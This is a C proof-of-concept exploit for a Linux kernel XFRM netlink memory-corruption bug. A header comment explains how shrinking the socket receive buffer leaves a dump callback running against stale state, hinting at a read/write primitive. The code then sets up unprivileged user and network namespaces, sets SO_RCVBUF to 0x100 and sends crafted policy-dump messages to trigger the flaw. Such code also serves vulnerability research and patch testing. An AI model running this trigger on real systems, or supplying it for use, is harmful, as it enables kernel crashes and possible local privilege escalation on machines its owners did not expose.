/* simo :  Linux Kernel XFRM memory corruption
   An unprivileged user can change Netlink socket subsystem – XFRM value
   sk->sk_rcvbuf (sk == struct sock object).

   The value can be changed into specific range via setsockopt(SO_RCVBUF).
   sk_rcvbuf is the total number of bytes of a buffer receiving data via
   recvmsg/recv/read.

   The sk_rcvbuf value is how many bytes the kernel should allocate for the
   skb (struct sk_buff objects).

   skb->trusize is a variable which keep track of how many bytes of memory are
   consumed, in order to not wasting and manage memory, the kernel can handle
   the skb size at run time.

   For example, if we allocate a large socket buffer (skb) and we only
   received 1-byte packet size, the kernel will adjust this by calling
   skb_set_owner_r.

   By calling skb_set_owner_r the sk->sk_rmem_alloc (refers to an atomic
   variable sk->sk_backlog.rmem_alloc) is modified.

   When we create a XFRM netlink socket, xfrm_dump_policy is called, when we
   close the socket xfrm_dump_policy_done is called.

   xfrm_dump_policy_done is called whenever cb_running for netlink_sock object
   is true.

   The xfrm_dump_policy_done tries to clean-up a xfrm walk entry which is
   managed by netlink_callback object.

   When netlink_skb_set_owner_r is called (like skb_set_owner_r) it updates
   the sk_rmem_alloc.

   netlink_dump():

   In above snippet we can see that netlink_dump() check fails when
   sk->sk_rcvbuf is smaller than sk_rmem_alloc (notice that we can control
   sk->sk_rcvbuf via stockpot).

   When this condition fails, it jumps to the end of a function and quit with
   failure and the value of cb_running doesn’t changed to false.

   nlk->cb_running is true, thus xfrm_dump_policy_done() is being called.

   nlk->cb.done points to xfrm_dump_policy_done, it worth noting that this
   function handles a doubly linked list, so if we can tweak this
   vulnerability to reference a controlled buffer, we could have a read/write
   what/where primitive.
 */
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <sched.h>
#include <unistd.h>

#define BUFSIZE 2048


int fd;
struct sockaddr_nl addr;

struct msg_policy {
    struct nlmsghdr msg;
    char buf[BUFSIZE];
};

void create_nl_socket(void)
{
    fd = socket(PF_NETLINK,SOCK_RAW,NETLINK_XFRM);
    memset(&addr,0,sizeof(struct sockaddr_nl));
    addr.nl_family = AF_NETLINK;
    addr.nl_pid = 0; /* packet goes into the kernel */
    addr.nl_groups = XFRMNLGRP_NONE; /* no need for multicast group */

}

void do_setsockopt(void)
{
    int var =0x100;

    setsockopt(fd,1,SO_RCVBUF,&var,sizeof(int));
}

struct msg_policy *init_policy_dump(int size)
{
    struct msg_policy *r;

    r = malloc(sizeof(struct msg_policy));
    if(r == NULL) {
        perror("malloc");
        exit(-1);
    }
    memset(r,0,sizeof(struct msg_policy));

    r->msg.nlmsg_len = 0x10;
    r->msg.nlmsg_type = XFRM_MSG_GETPOLICY;
    r->msg.nlmsg_flags = NLM_F_MATCH | NLM_F_MULTI |  NLM_F_REQUEST;
    r->msg.nlmsg_seq = 0x1;
    r->msg.nlmsg_pid = 2;
    return r;

}
int send_msg(int fd,struct nlmsghdr *msg)
{
    int err;
    err = sendto(fd,(void *)msg,msg->nlmsg_len,0,(struct sockaddr*)&addr,sizeof(struct sockaddr_nl));
    if (err < 0) {
        perror("sendto");
        return -1;
    }
    return 0;

}

void create_ns(void)
{
	if(unshare(CLONE_NEWUSER) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(1);
	}
	if(unshare(CLONE_NEWNET) != 0) {
		perror("unshared(CLONE_NEWUSER)");
		exit(2);
	}
}
int main(int argc,char **argv)
{
    struct msg_policy *p;
    create_ns();

    create_nl_socket();
    p = init_policy_dump(100);
    do_setsockopt();
    send_msg(fd,&p->msg);
    p = init_policy_dump(1000);
    send_msg(fd,&p->msg);
    return 0;
}
